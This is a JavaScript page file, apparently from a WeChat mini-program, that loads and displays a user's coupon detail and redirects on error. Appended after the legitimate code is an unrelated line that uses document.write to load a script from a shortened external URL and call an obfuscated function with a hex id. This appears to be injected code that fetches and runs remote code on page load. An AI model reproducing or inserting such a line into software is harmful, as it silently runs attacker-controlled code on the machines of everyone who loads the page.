var a = getApp(),
  e = a.requirejs("core"),
  t = a.requirejs("wxParse/wxParse");
Page({
  data: {
    approot: a.globalData.approot
  },
  onLoad: function (a) {
    this.setData({
      id: a.id
    }),
      this.getDetail()
  },
  getDetail: function (a) {
    var o = this;
    e.get("sale/coupon/my/showcoupon2", {
      id: this.data.id
    }, function (a) {
      a.error > 0 ? wx.redirectTo({
        url: "/pages/sale/coupon/my/index/index"
      }) : (t.wxParse("wxParseData", "html", a.detail.desc, o, "5"), o.setData({
        detail: a.detail,
        goods: a.goods,
        show: true
      }))
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
